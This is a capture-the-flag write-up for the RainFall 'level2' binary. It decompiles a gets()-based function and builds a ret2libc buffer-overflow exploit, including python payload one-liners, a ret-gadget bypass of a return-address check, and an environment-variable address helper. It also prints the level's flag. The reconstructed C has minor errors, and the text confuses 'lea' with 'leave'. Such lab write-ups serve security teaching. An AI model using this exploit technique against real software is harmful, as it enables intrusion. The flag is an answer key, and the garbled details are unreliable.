## level2
 ![image](https://hackmd.io/_uploads/S12njR2N6.png)
On the surface, it looks like the program here is similar to the past level, where it takes in an input and prints it. The objdump of the program is the following :  

![image](https://hackmd.io/_uploads/BkSYi2EBT.png)

Its a main function that does stack alignment and calls function `p` without any input.

the `p` function however, does alot of things.

after setting up the stack frame, it loads stdout into the first argument of `fflush` and calls it.

![image](https://hackmd.io/_uploads/BycRDa4HT.png)

After fflush returns, a pointer at the address `ebp - 0x4c` is loaded to the first argument to `gets()` @ `0x80448ed` and calls it. With this information, we know that a buffer starts at `ebp - 0x4c` now.

After gets returned, it seems like the saved EIP is extracted and put into eax, which is put into a value in the stack with the address `ebp - 0xc`. The saved EIP is then masked to match 0xb0000000, which if its equals, `printf` is called followed by `exit`. The function will not call the saved EIP.

And according to [this manual](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html), the function `__builtin_return_address ` returns the save EIP of the current function, which might be `0x80484f2` is doing.

If its not equal however, it loads the buffer which is written by `gets()` into the first argument of puts then it is called. 

The buffer from `gets()` is also loaded into the first argument of strdup, which is called and returned to the parent since there are no writes to `eax`.

After looking at the stack allocations, we are also able to determine the size of the buffer.

![image](https://hackmd.io/_uploads/r1K1C6Nra.png)


```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
    
void p()
{
    // 0x80484e7
    char buffer[64];
    void *saved_eip
    
    // 0x80484e2
    fflush(stdout);
    
    // 0x80484ed
    gets(buffer);
    
    // 0x80484f2 - 0x80484f5
    saved_eip = __builtin_return_address(0);
    if ((saved_eip & 0xb0000000) == 0xb0000000)
    {
        printf("%x\n", saved_eip);
        exit(1);
    }
    
    // 0x8048500
    if (((unsigned long)saved_eip & 0xb0000000) ==  0xb0000000)
	{
        // 0x8048516
		printf("(%p)\n", saved_eip);
		exit(1);
	}
        
    // 0x804852d
    puts(buffer);
    
    // 0x8048538
    return strdup(buffer);
}

int main()
{
    p();
}
```
First off, with any buffer overflow exploit, we need to determine the offset to the EIP. Using information from this level and last level, our offset should be

```
sizeof buffer + sizeof saved_eip + sizeof ebp

=>

64 + 12 + 4 = 80
```

Notice there **is no stack alignemnt as we dont see `and 0xfffffff0`**. And we can verify it like so by comparing the input length of 81

![image](https://hackmd.io/_uploads/BkojzM8B6.png)

and 80 
![image](https://hackmd.io/_uploads/rkFafzUH6.png)


Looking at the program behaviour, we are not supposed to overwrite the EIP to any instruction pointer in the program since the program code all starts with 0x8000000. Trying to do so will cause `exit()` to be called instead of return, which means the EIP wont be read.

To circumvent this, we pass the libc function `system()` as the return address override instead, also providing its inputs on the stack. AKA ret2libc

To get the pointer to the `system()` function, create a program that calls `system()`, open it in gdb and use the `print` command to display the value of the `system()` function, which will be a instruction pointer `0xb7e6b060`

![image](https://hackmd.io/_uploads/B1wCSWIBp.png)

After that, we have to find a way to populate the parameters of the function. Since libC functions **reads inputs return addresses and inputs from the stack**, The first 4 bytes is the return address, we dont want  to return anything, so we just put random bytes `BEEF`. the next 4 bytes should be a string, which is a pointer to a character sequence, which we can utilize the environment variables like so:

```clike=
// getenv.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc < 3) {
                printf("Usage: %s <environment var> <target program name>\n", argv[0]);
                exit(0);
         }
        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf("%s will be at %p\n", argv[1], ptr);
}
```


```
level2@RainFall:/tmp$ gcc getenv.c; ./a.out BINSH ./level2
BINSH will be at 0xbfffff38
level2@RainFall:/tmp$
```
we are able to predict the address because environment variables are stored at the start of the stack frame which is relative of the programs name, which gives us `0xbfffff38`

So, our input shall be 
`python -c "print 'B' * 80 + '\xb7\xe6\xb0\x60'[::-1] + 'BEEF' + '\xbf\xff\xff\x38'[::-1]" > /tmp/out`

OOPS, I forgot about the check stack check earlier at `0x80484f2 - 0x80484f5` and I got the printf output.

```
level2@RainFall:~$ ./level2 < /tmp/out
(0xb7e6b060)
```

Based on [this SO post](https://stackoverflow.com/questions/5130654/when-how-does-linux-load-shared-libraries-into-address-space), **.so objects are loaded into mmaped memory (stack)** during runtime, hence failing the check.

I digged around the acutal working of the `lea` and `ret` instruction and here are the things they do according to [this](https://www.felixcloutier.com/x86/leave) and [this](https://www.felixcloutier.com/x86/ret).

The leave instruction does the following:

- Copies the frame pointer (in the EBP register) into the stack pointer register (ESP). This effectively releases the stack space that was allocated to the current function's stack frame.
- **Pops** the old frame pointer (the frame pointer for the calling procedure that was saved by the enter instruction) from the stack into the EBP register. This restores the calling procedure's stack frame 2.


The ret instruction does not take any operands and its operation is as follows:

- It **pops** the return address from the stack into the instruction pointer (EIP for x86, RIP for x86_64).
- It then jumps to the address stored in the instruction pointer.

![image](https://hackmd.io/_uploads/Sk6Sf7uSa.png)

As we can see, the `lea` and `ret` command pops from the stack, slowly consuming it. The `lea` command does not check if the value it pops is valid or not, neither does `ret`. It just **assumes** that all the data it popped is in the correct position and just writes to the registers.

With this knowledge, we are able to chain `ret` calls to bypass the stack check like so:

![image](https://hackmd.io/_uploads/B1xWEX_ST.png)

To prove that, I made the input command using the command below. the `'\x08\x04\x85\x3e'[::-1]`s are addresses to the `ret` instructions.

`python -c "print 'B' * 80 + '\x08\x04\x85\x3e'[::-1] + '\xb7\xe6\xb0\x60'[::-1] + 'BEEF' + '\xbf\xff\xff\x38'[::-1]" > /tmp/out`

After that, I launch the program with stdin open using 
`cat /tmp/out - | ./level2` and it works. The flag is `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
![image](https://hackmd.io/_uploads/HJSbIXOST.png)

And the final source code is 
```clike=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
    
char * p()
{
    // 0x80484e7
    char buffer[64];
    void *saved_eip
    
    // 0x80484e2
    fflush(stdout);
    
    // 0x80484ed
    gets(buffer);
    
    // 0x80484f2 - 0x80484f5
    saved_eip = __builtin_return_address(0);
    if ((saved_eip & 0xb0000000) == 0xb0000000)
    {
        printf("%x\n", saved_eip);
        exit(1);
    }
    
    // 0x8048500
    if (((unsigned long)saved_eip & 0xb0000000) ==  0xb0000000)
	{
        // 0x8048516
		printf("(%p)\n", saved_eip);
		exit(1);
	}
        
    // 0x804852d
    puts(buffer);
    
    // 0x8048538
    return strdup(buffer);
}

int main()
{
    p();
}
```